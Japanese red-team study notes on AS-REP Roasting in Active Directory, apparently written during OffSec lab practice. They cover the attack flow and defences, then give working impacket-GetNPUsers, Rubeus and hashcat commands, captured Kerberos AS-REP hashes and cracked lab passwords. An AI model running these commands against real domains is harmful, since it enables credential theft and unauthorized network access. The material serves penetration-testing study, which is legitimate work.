---
title: AS-REP Roasting
parent: Active Directory
grand_parent: Red Team
nav_order: 303
---
- ADユーザーアカウントオプション「Kerberos事前認証を必要としない」が有効になっているユーザが存在した場合に有効な攻撃
- DCからAS-REPを取得する
- 取得後は、攻撃者は応答の暗号化された部分に対してオフラインパスワード攻撃を実施する

# 攻撃の流れ

1.	ターゲットアカウントの特定: 攻撃者は、Active Directory内のユーザーアカウントのうち、「pre-authentication」が無効になっているアカウントを特定します。
2.	AS-REQ送信: 攻撃者はAS-REQ（認証サーバーリクエスト）を送信し、ターゲットユーザーの認証チケット（TGT）を要求します。この際、pre-authenticationが無効になっているため、パスワードの検証なしにサーバーは応答します。
3.	AS-REPの受信: 認証サーバー（KDC）は、暗号化されたTGTを含むAS-REP（認証サーバーレスポンス）を返します。この応答には、ユーザーのパスワードハッシュで暗号化された部分が含まれています。
4.	ハッシュのオフラインクラック: 攻撃者は取得したAS-REPレスポンスをオフラインで解析し、ユーザーのパスワードをクラックします。これにより、認証情報が手に入る可能性があります。

# 防御策

•	Kerberos pre-authenticationを有効にする: ユーザーアカウントの設定で「pre-authentication」を必ず有効にすることで、この攻撃を防ぐことができます。
•	監視とログの分析: Kerberos関連の異常な認証リクエストを監視し、AS-REP Roastingの兆候がないかログを定期的に確認することも重要です。
# Kali（リモートホスト）から実施

## impacket-GetNPUsers
## AS-REPハッシュの取得

```bash
impacket-GetNPUsers -dc-ip 192.168.158.70  -request -outputfile hashes.asreproast corp.com/pete
```
-  -dc-ip DCのIPアドレス
-  -request TGTを要求する
- -outputfile AS-REPハッシュがHashcat形式で保存される出力ファイル名
- domain/user 対象の認証情報をの形式で指定する必要がある。認証に使用するユーザー

```
Password:
Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC      
----  ----------------------------------------  --------------------------  --------------------------  --------
dave  CN=Development Department,DC=corp,DC=com  2022-09-08 01:54:57.521205  2025-08-18 14:56:28.418380  0x410200 

$krb5asrep$23$dave@CORP.COM:4f6bd8d9065ce746fce6774fa45ad9e1$01dea4cfbd08efe41918aad29ae2e2491bb9de0868630eac1d151d8baa45bcc6c40b5483f606ee914ddcf5397a848d2ce88588aa23dfbd431872894d277cbb25158e36ee6bba3f4c9df9254f4f95aa0f1f2ce68bc97127ffb9137b3f049767b4a293436c6f7ac7f25e8421dffd0c7b43d67ca5501685bd953ed18e4902be0dabc9eb9fb299ff7daf386564a7199a620ec1ce1516b95691a3f94e0d3fd3cc99dbfd479c0abf98c8daa0aaed1f0daad1e8762c73e0b18d69bfdd3ae322e162217cf4a152e750bb441ea035bb15c8355748f77b4cee173841d1f9b195578305bc1cbf019db5
```
- AS-REPハッシュが取得できる
- 
## ハッシュ解析
#### ハッシュモードの特定
```bash
hashcat --help | grep -i "Kerberos"
```

```zsh
18200 | Kerberos 5, etype 23, AS-REP         | Network Protocol
```
AS-REPに関するハッシュモードは18200だとわかる

#### ハッシュ解析
```zsh
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
「この攻撃には割り当て可能なデバイス メモリが足りません」という Hashcat エラーが表示された場合は、Kali VM をシャットダウンして RAM を追加してください。

```bash
$krb5asrep$23$dave@CORP.COM:4f6bd8d9065ce746fce6774fa45ad9e1$01dea4cfbd08efe41918aad29ae2e2491bb9de0868630eac1d151d8baa45bcc6c40b5483f606ee914ddcf5397a848d2ce88588aa23dfbd431872894d277cbb25158e36ee6bba3f4c9df9254f4f95aa0f1f2ce68bc97127ffb9137b3f049767b4a293436c6f7ac7f25e8421dffd0c7b43d67ca5501685bd953ed18e4902be0dabc9eb9fb299ff7daf386564a7199a620ec1ce1516b95691a3f94e0d3fd3cc99dbfd479c0abf98c8daa0aaed1f0daad1e8762c73e0b18d69bfdd3ae322e162217cf4a152e750bb441ea035bb15c8355748f77b4cee173841d1f9b195578305bc1cbf019db5:Flowers1
```
Flowers1

---
# Windows（イントラネット）から実施

## Rubeus.exe
- ファイルのパス
```zsh
ls /usr/share/windows-resources/rubeus 
Rubeus.exe
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Access]
└─$ cp /usr/share/windows-resources/rubeus/Rubeus.exe . 
```
## AS-REPハッシュの取得
### 
Rubeus.exeを使用する
```powershell
.\Rubeus.exe asreproast /nowrap
```
- /nowrap 生成されるAS-REPハッシュに新しい行が追加されないようにする

![](../../../assets/images/Pasted%20image%2020260502085904.png)
ファイルに書き込み
```zsh
echo '$krb5asrep$dave@corp.com:978225AF200FCC6E3659400A543AA53A$CBA47E2ABBF538E17E25AF1746E6E6A32E09538A82E518BB8B902F746ECF7757722685A4E02525BE97821526F5FF2D791BEBC0F5A6E755BBD2B5AE29BED86149116B99339E94DA845852FAA96CC9102C3498CBDF79BD807C0212C5B73DC370998874255A832CBFD780D612C5F8467DFEE3058D40EE892C88AD38C001480EED4A2C0EBB93219B4A18A90C58B5139440D35302437C1040EE1D1F02402E67FE96AF576A45879D04FFF77C318D7428F86A548FE5C11FCE06379E1B3738E0C13543B88221041A32E04A17E4978B2B775FFBD109EE7E5A8A30DB97471D8E2039C848618E82DA5F' > hashes.asreproast2
```

## ハッシュ解析
```zsh
sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
Flowers1

---

# Example
1
## AS-REP Roasting
```zsh
impacket-GetNPUsers -dc-ip 192.168.158.70  -request -outputfile hashes.asreproast corp.com/pete
```
![](../../../assets/images/Pasted%20image%2020260513225256.png)

```zsh
sudo hashcat -m 18200 hashes.asreproast rockyou_1.txt -r /usr/share/hashcat/rules/best64.rule --force
```


```
$krb5asrep$23$mike@CORP.COM:d3321836c643e1623a5f35124a80d036$41d9e978dacc9b070ee6166e22dedc47aa2de166468d8381ff330dd6c1483e1caddf3a0f12a30832b18dd47e53d85c5fde0a60fb5648c81d1a897e6838cb4ef3f31701b72ee9445a246caa0c79f0dbef95234844d08a7093e4a88b6ad454b09ca66eecb9aec7b2d8c2927d69bbdafd383e1da3f41ca2783cb9491271c3246c7d1152ea793169e0375b75c50dd3130894c86a68e4c5d8566016c4d4195cea4eaf6790a37f3efda9125563dd961c3ec8f4bb7908597122440429be1871f154fca2b70c3aeb76c0d69bc117669f55fbe2e5ed2eb9bb4ed0d55c39930d2af36a0ee07ae46bf0:Darkness1099!
```
- mike:Darkness1099!

- mikeはCLIENT75にログイン可能
